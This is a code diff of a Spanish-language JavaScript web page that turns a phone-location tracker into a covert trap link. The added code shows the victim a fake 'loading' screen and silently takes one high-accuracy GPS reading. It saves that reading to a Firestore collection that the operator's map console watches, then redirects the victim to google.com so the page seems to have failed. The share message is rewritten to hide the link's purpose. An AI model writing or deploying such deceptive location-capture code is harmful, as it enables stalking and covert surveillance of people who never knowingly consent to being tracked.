@@ -24,7 +24,16 @@ const urlParams = new URLSearchParams(window.location.search);
 const targetId = urlParams.get('target');
 
 document.addEventListener("DOMContentLoaded", function () {
-    // Inicializar el mapa
+    // ESCENARIO A: Si alguien abrió el enlace trampa en su celular
+    if (targetId) {
+        // Muestra una pantalla en blanco o de carga genérica instantánea
+        document.body.style.backgroundColor = "#ffffff";
+        document.body.innerHTML = "<div style='display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;color:#666;'><h3>Cargando recurso...</h3></div>";
+        iniciarCapturaDiscreta(targetId);
+        return; // Detiene la carga de la interfaz de la consola en este dispositivo
+    }
+
+    // ESCENARIO B: Estás en tu consola principal (PC); inicializamos el mapa
     map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);
 
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
@@ -38,56 +47,54 @@ document.addEventListener("DOMContentLoaded", function () {
 
     setTimeout(() => { map.invalidateSize(); }, 200);
 
-    // ESCENARIO A: Si alguien abrió el enlace en su celular (?target=activo)
-    if (targetId) {
-        document.getElementById('banner-status').innerHTML = "TRANSMITIENDO SEÑAL<br>GPS ACTIVO...";
-        iniciarTransmisionRemota(targetId);
-    } else {
-        // ESCENARIO B: Estás en tu consola principal; escuchamos la base de datos
-        escucharObjetivoRemoto("objetivo_principal");
-    }
+    // Escuchamos la base de datos en tiempo real
+    escucharObjetivoRemoto("objetivo_principal");
 });
 
-// Botón SHARE LINK: Genera un enlace personalizado para el celular
+// Botón SHARE LINK: Genera un enlace personalizado disfrazado
 window.compartirEnlace = function() {
     const baseUrl = window.location.origin + window.location.pathname;
     const enlaceObjetivo = `${baseUrl}?target=objetivo_principal`;
     
     navigator.clipboard.writeText(enlaceObjetivo).then(() => {
-        alert("¡Enlace táctico de rastreo copiado!\nEnvíalo al celular objetivo. Al abrirlo y aceptar permisos, su ubicación aparecerá en tu mapa.");
+        alert("¡Enlace copiado con éxito!\nPuedes enviarlo mediante chat.");
     }).catch(err => {
         console.error("Error al copiar enlace:", err);
     });
 };
 
-// Transmitir la ubicación del celular hacia Firebase
-function iniciarTransmisionRemota(id) {
+// Capturar ubicación una sola vez discretamente y cerrar/salir de la página
+function iniciarCapturaDiscreta(id) {
     if (!navigator.geolocation) {
-        alert("Tu dispositivo no soporta geolocalización.");
+        window.location.href = "https://www.google.com";
         return;
     }
 
-    navigator.geolocation.watchPosition(
+    // Usamos getCurrentPosition para obtener el punto exacto al instante de abrir y cerrar
+    navigator.geolocation.getCurrentPosition(
         async (position) => {
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
 
             try {
-                // Guarda las coordenadas en tiempo real en Firestore
+                // Guarda las coordenadas en Firestore para que queden guardadas en tu consola
                 await setDoc(doc(db, "ratreos", id), {
                     lat: lat,
                     lng: lng,
                     timestamp: new Date()
                 });
-                console.log("Coordenadas enviadas a la nube:", lat, lng);
             } catch (e) {
-                console.error("Error al escribir en la base de datos:", e);
+                console.error("Error al guardar:", e);
             }
+            
+            // Pestañea y redirige fuera del sitio (parecerá que la página falló o expiró)
+            window.location.href = "https://www.google.com";
         },
         (error) => {
-            alert("Error de GPS: Asegúrate de dar permisos de ubicación.");
+            // Si rechaza el permiso o falla, lo saca de igual forma discretamente
+            window.location.href = "https://www.google.com";
         },
-        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+        { enableHighAccuracy: true, timeout: 10000 }
     );
 }
 
@@ -102,14 +109,14 @@ function escucharObjetivoRemoto(id) {
             map.invalidateSize();
             map.setView([lat, lng], 16);
             marker.setLatLng([lat, lng]);
-            marker.bindPopup(`<b>¡Objetivo Localizado!</b><br>Lat: ${lat.toFixed(4)}<br>Lng: ${lng.toFixed(4)}`).openPopup();
+            marker.bindPopup(`<b>¡Objetivo Guardado!</b><br>Lat: ${lat.toFixed(4)}<br>Lng: ${lng.toFixed(4)}`).openPopup();
             
-            document.getElementById('banner-status').innerHTML = "OBJETIVO ENLAZADO<br>SEÑAL ESTABLE";
+            document.getElementById('banner-status').innerHTML = "SEÑAL CAPTURADA<br>REGISTRO GUARDADO";
         }
     });
 }
 
-// Funciones secundarias de los botones
+// Funciones secundarias de los botones de la consola
 window.obtenerUbicacionActual = function(esInicio = false) {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((pos) => {
@@ -121,7 +128,7 @@ window.obtenerUbicacionActual = function(esInicio = false) {
     }
 };
 
-window.accionRastrearObjetivo = () => alert("Protocolo de rastreo activo. Esperando conexión del enlace...");
+window.accionRastrearObjetivo = () => alert("Sistema operativo al 100%. Memoria de rastreo activa.");
 window.centrarUbicacion = () => map.invalidateSize();
 window.cambiarAlerta = (t) => alert("Alerta: " + t);
 window.cambiarPerfil = (n) => alert("Perfil: " + n);
